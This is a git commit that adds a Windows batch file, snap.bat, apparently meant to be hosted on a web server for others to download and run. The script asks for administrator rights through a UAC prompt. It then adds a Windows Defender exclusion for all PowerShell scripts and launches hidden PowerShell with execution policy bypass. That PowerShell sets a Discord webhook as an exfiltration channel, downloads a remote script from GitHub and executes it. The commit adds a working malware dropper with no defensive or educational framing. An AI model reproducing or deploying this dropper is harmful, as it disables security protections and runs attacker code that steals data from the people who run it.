c9e55a4c33a0f5696cb163528e2b799e5c4a1eb3
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 02:13:51 +0530

    Create snap.bat

---
+++ snap.bat
@@ -0,0 +1,31 @@
+REM - This is not the file you need to run. You need to upload this file to your webserver.
+
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension ps1"
+cd %TEMP%
+powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1377273360899244032/sfISpqX7vLusl2HGJ3Jwsirra-A6vPogZPUEsTTmYPgDVCXWnRIIGYy5UObuNX1P8wVF'; irm https://raw.githubusercontent.com/CloudFox9/Files/refs/heads/main/snaky.ps1 | iex
